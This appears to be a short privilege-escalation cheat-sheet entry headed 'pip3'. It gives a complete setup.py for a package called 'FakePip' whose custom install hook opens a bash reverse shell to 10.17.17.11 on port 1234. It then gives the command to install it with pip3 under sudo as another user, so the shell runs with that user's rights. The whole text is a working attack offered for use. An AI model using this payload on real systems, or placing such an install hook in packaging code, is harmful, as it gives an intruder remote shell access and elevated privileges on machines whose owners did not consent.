# pip3
```text-plain
from setuptools import setup
from setuptools.command.install import install
import base64 
import os
class CustomInstall(install):
        def run(self):
                install.run(self)
                os.system("bash -c 'bash -i >& /dev/tcp/10.17.17.11/1234 0>&1' ")

setup(name='FakePip',
        version='0.0.1',
        description='this is nice',
        author='123',
        author_email='and@gmail.com',
        license='MIT',
        zip_safe=False,
        cmdclass={'install': CustomInstall})
```

name file as setup.py, make an empty directory with only this file and run

```text-plain
sudo -u <user> /usr/bin/pip3 install . --upgrade --force-reinstall
```